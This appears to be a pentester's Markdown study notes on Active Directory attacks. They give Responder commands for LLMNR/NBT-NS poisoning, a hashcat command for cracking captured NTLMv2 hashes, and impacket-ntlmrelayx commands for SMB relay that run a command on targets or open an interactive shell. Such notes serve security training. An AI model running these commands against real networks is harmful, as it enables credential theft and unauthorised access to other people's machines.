# Active Directory
## LLMNR Poisoning
- Link Local Multicast Name Resolution (LLMNR)
- Used to identify hosts when DNS fails to do so.
- Previously NBT-NS.
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to.
- With a MitM, you can observe the broadcast for people looking to connect to a share and crack the hash offline.

> ## Note
> You must be on the same network to capture this traffic.

1. To run the process:
````bash
sudo responder -I {interface} -dwP
````
![](images/responder.png)

2. Add hash to a .txt file.

3. Crack the hashes:
 ````bash
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
 ````
> ## Tip
> Its better to run hashcat on bare metal.
> To find what code to use grep the code, for example
> `hashcat --help | grep NTLM`

## SMB Relay
- Instead of cracking hashes we can relay those hashes to specific machines and potentially gain access.
- SMB signing must be disabled or not enforced.
    - You'll see this as an option with your NMAP script.

1. To start you need to adjust your responder.conf file to allow for this attack.
````bash
sudo vim /etc/responder/Responder.conf
````
- Set SMB and HTTP to off on lines 5 and 12 respectively.
![](images/responder_conf.png)

2. Run impacket. This will start similar to responder.
````bash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami" 
````
OR to gain an interactive shell run:
````bash
impacket-ntlmrelayx -tf targets.txt -smb2support -i
````

> ## Note
> I previously created a file with the IP addresses of my targets and ran the command from that same folder.

![](images/smb_relay.png)